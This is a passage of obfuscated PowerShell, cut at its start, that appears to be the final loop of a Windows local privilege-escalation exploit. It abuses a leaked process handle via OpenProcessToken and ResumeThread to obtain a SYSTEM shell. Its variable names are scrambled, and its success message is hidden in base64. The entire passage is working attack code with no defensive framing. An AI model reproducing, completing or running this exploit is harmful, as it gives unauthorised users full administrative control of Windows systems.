			[ref]${6}, [ref]${3})
		if (!${4}) {
			continue
		}
		${5} = [IntPtr]::Zero
		${4} = [Advapi32]::OpenProcessToken(${3}.hProcess, 0x28, [ref]${5})
		if (!${4}) {
			echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABIAG8AbAB5ACAAaABhAG4AZABsAGUAIABsAGUAYQBrACAAQgBhAHQAbQBhAG4ALAAgAHcAZQAgAGgAYQB2AGUAIABhACAAUwBZAFMAVABFAE0AIABzAGgAZQBsAGwAIQAhAAoA')))
			${4} = [Kernel32]::ResumeThread(${3}.hThread)
			${2}.Stop()
			${1}.Stop()
			Return
		}
		${4} = [Kernel32]::TerminateProcess(${3}.hProcess, 1)
		${4} = [Kernel32]::CloseHandle(${3}.hProcess)
		${4} = [Kernel32]::CloseHandle(${3}.hThread)
	}
	${2}.Stop()
	${1}.Stop()
}
